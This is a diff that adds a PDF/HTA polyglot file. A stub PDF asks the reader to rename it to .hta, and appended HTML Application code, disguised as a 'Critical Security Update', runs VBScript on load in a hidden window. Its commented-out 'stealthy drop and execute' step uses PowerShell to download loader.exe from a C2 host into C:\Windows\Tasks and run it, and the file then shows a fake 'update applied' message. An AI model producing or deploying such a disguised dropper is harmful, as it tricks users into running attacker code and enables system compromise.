@@ -1,0 +1,69 @@
+%PDF-1.1
+%¥±ë
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 50 >>
+stream
+BT /F1 12 Tf 70 700 Td (Please rename this file to .hta to view correctly.) Tj ET
+endstream
+endobj
+xref
+0 5
+0000000000 65535 f
+0000000015 00000 n
+0000000062 00000 n
+0000000117 00000 n
+0000000212 00000 n
+trailer
+<< /Size 5 /Root 1 0 R >>
+startxref
+311
+%%EOF
+
+<!-- 
+    The following is the HTA payload. 
+    Windows will ignore the PDF binary data at the start when executed via mshta.exe.
+-->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Critical Security Update</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="SecurityUpdate"
+        BORDER="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="minimize">
+    <script language="VBScript">
+        Sub Main()
+            Dim shell, fso, targetPath
+            Set shell = CreateObject("WScript.Shell")
+            Set fso = CreateObject("Scripting.FileSystemObject")
+
+            ' Implementation of a stealthy drop and execute
+            targetPath = "C:\Windows\Tasks\loader.exe"
+            
+            ' In a real scenario, the loader binary would be extracted from the polyglot's own body
+            ' or downloaded from a C2 server. For this example, we log the attempt.
+            
+            ' Example: shell.Run "powershell -Command ""Invoke-WebRequest -Uri 'http://c2.internal/loader.exe' -OutFile '" & targetPath & "'""", 0, True
+            ' shell.Run targetPath, 0, False
+
+            MsgBox "System update applied successfully.", 64, "Information"
+            window.close()
+        End Sub
+    </script>
+</head>
+<body onload="Main()">
+</body>
+</html>
